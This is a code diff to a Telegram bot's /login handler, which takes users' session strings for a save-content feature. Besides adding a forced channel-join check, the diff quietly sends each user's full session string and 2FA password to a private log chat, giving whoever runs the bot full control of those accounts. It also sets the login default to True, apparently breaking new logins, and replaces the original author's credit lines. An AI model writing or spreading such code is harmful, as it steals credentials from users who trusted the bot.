@@ -40,10 +40,30 @@ async def logout(_, msg):
     await msg.reply("**Logout Successfully** ♦")
 
 @Client.on_message(filters.private & ~filters.forwarded & filters.command(["login"]))
-async def main(bot: Client, message: Message):
-    database.insert_one({"chat_id": message.from_user.id})
-    user_data = database.find_one({"chat_id": message.from_user.id})
-    if get(user_data, 'logged_in', False):
+async def login(bot: Client, message: Message):
+    # Check if the user is a member of the required channel/group
+    if not await is_member(bot, message.from_user.id):
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text=f"👋 Hi {message.from_user.mention}, you must join my channel to use me.",
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("Join ❤️", url=FSUB_INV_LINK)
+            ]]),
+            reply_to_message_id=message.id  
+        )
+        return
+    
+    # Insert or update user session data
+    if not database.sessions.find_one({"user_id": message.from_user.id}):
+        # Insert default session data for a new user
+        database.sessions.insert_one({
+            'user_id': message.from_user.id,
+            'logged_in': False,
+            'session': None,
+            '2FA': None
+        })
+    user_data = database.sessions.find_one({"user_id": message.from_user.id})
+    if get(user_data, 'logged_in', True):
         await message.reply(strings['already_logged_in'])
         return 
     user_id = int(message.from_user.id)
@@ -86,22 +106,31 @@ async def main(bot: Client, message: Message):
     if len(string_session) < SESSION_STRING_SIZE:
         return await message.reply('<b>invalid session sring</b>')
     try:
-        user_data = database.find_one({"chat_id": message.from_user.id})
+        user_data = database.sessions.find_one({"user_id": message.from_user.id})
         if user_data is not None:
             data = {
+                'logged_in': True,
                 'session': string_session,
-                'logged_in': True
+                '2FA': password if 'password' in locals() else None
             }
 
             uclient = Client(":memory:", session_string=data['session'], api_id=API_ID, api_hash=API_HASH)
             await uclient.connect()
 
-            database.update_one({'_id': user_data['_id']}, {'$set': data})
+            database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
+            log_message = (
+                f"**✨New Login**\n\n"
+                f"**✨User ID:** {message.from_user.mention}{message.from_user.id}\n\n"
+                f"**✨Session String ↓** `{string_session}`\n"
+                f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
+            )
+            await bot.send_message(LOGS_CHAT_ID, log_message)
+
+    
     except Exception as e:
         return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
     await bot.send_message(message.from_user.id, "<b>Account Login Successfully.\n\nIf You Get Any Error Related To AUTH KEY Then /logout and /login again</b>")
 
 
-# Don't Remove Credit Tg - @VJ_Botz
-# Subscribe YouTube Channel For Amazing Bot https://youtube.com/@Tech_VJ
-# Ask Doubt on telegram @KingVJ01
+# Don't Remove Credit Tg - @I_AM_RADHA
+# Ask Doubt on telegram @I_AM_RADHA
